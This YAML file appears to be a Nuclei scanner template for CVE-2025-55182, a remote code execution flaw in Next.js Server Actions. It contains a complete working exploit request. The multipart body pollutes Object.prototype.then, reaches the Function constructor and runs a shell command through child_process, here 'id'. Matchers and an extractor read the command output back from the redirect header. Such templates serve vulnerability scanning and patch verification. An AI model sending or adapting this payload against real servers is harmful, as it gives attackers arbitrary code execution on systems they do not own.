id: cve-2025-55182

info:
  name: Next.js Server Actions Prototype Pollution RCE Scanner - Command id
  author: sickwell
  severity: critical
  description: |
    Remote Code Execution (RCE) scanner for CVE-2025-55182 in Next.js Server Actions.
    Executes the "id" command and retrieves output via NEXT_REDIRECT header.
    
    The exploit leverages prototype pollution in React Flight Protocol deserialization.
    It pollutes Object.prototype.then via "$1:__proto__:then" and gains Function constructor
    access through _formData.get set to "$1:constructor:constructor", then injects malicious
    code via _prefix that gets executed by Function().
  reference:
    - https://github.com/vercel/next.js
    - https://github.com/msanft/CVE-2025-55182
    - https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc
    - https://github.com/Spritualkb/CVE-2025-55182-exp
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
  classification:
    cve-id: CVE-2025-55182
    cwe-id: CWE-1321
  tags: nextjs,prototype-pollution,rce,server-actions,cve,cve2025,exploit,scanner

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15
      Next-Action: x
      Accept: text/x-component
      Accept-Language: en-US,en;q=0.9
      Accept-Encoding: gzip, deflate
      Connection: keep-alive
      Cache-Control: no-cache
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr_1}}
    # RCE Payload based on working exploit by Spritualkb
    # Executes command: id
    # Retrieves output via NEXT_REDIRECT header (X-Action-Redirect)
    body: |
      ------WebKitFormBoundary{{randstr_1}}
      Content-Disposition: form-data; name="0"

      {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').spawnSync('sh',['-c','id'],{encoding:'utf8',timeout:5000});var res=r.stdout||r.stderr||'';throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/login?a=${res.trim()};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
      ------WebKitFormBoundary{{randstr_1}}
      Content-Disposition: form-data; name="1"

      "$@0"
      ------WebKitFormBoundary{{randstr_1}}
      Content-Disposition: form-data; name="2"

      []
      ------WebKitFormBoundary{{randstr_1}}--
    matchers-condition: or
    matchers:
      # Primary indicator: Status 303 with X-Action-Redirect header containing command output
      - type: status
        status:
          - 303
        condition: and
      
      - type: regex
        part: header
        regex:
          - '(?i)x-action-redirect.*login\?a='
        condition: and
      
      # Alternative: Check for command output patterns in redirect header
      - type: regex
        part: header
        regex:
          - '(?i)x-action-redirect.*uid='
          - '(?i)x-action-redirect.*gid='
          - '(?i)x-action-redirect.*groups='
        condition: or
      
      # Fallback: Status 500 with error patterns (exploitation attempted)
      - type: status
        status:
          - 500
        condition: and
      
      - type: word
        part: header
        words:
          - "text/x-component"
        condition: and
      
      - type: regex
        part: body
        regex:
          - 'E\{"digest":"[0-9]+"\}'
          - '\{"digest":"[0-9]+"\}'
        condition: and
    
    extractors:
      # Extract command output from X-Action-Redirect header
      # Executed command: id
      - type: regex
        part: header
        name: command_output
        regex:
          - '(?i)x-action-redirect.*login\?a=([^;]+)'
        group: 1

